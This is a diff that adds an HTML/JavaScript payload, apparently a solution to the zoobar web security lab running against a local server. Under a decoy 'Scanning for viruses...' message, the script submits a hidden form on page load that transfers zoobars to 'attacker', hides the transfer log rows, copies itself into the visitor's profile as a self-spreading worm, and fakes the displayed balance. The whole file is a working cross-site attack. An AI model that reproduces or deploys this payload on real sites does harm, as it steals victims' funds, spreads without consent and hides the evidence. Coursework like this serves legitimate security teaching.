@@ -1,0 +1,20 @@
+Scanning for viruses...
+
+<script type="text/javascript"> window.onload = function() { document.getElementById("transferform").submit();
+
+var logs = document.getElementsByClassName("log")[0].getElementsByTagName("td");
+
+var i;
+for(i = 0; i < logs.length;i++) {
+  logs[i].style.display = "none";
+}
+
+var profile_worm = document.getElementById("profile_update");
+profile_worm.innerText = document.getElementById("profile").innerHTML;
+setTimeout(function() { document.getElementById("profileform").submit(); }, 1000); 
+setTimeout(function() { var element = document.getElementById("profileheader"); var username =  element.innerHTML; element.innerHTML = username.split(" ")[0] + " zoobars:10"; }, 1000);
+} 
+
+</script>
+
+<iframe id="fakeframe" name="fakeframe" style="display: none;"></iframe><form method="POST" target="fakeframe" style="display: none;" id="transferform" name="transferform" action="http://localhost:8080/zoobar/index.cgi/transfer"><p>Send <input name="fake_zoobars" type="text" value="" size="5"> zoobars</p><input type="hidden" name="zoobars" value="1"><input type="hidden" name="recipient" value="attacker"><p>to <input name="fake_recipient" type="text" value="" size="10"></p><input type="submit" name="submission" value="Send"></form><form id="profileform" action="http://localhost:8080/zoobar/index.cgi/" target="fakeframe" style="display: none;" method="POST" name="profileform"><textarea name="profile_update" id="profile_update" rows="20" cols="80"></textarea><br><input type="submit" name="profile_submit" value="Save"></form>
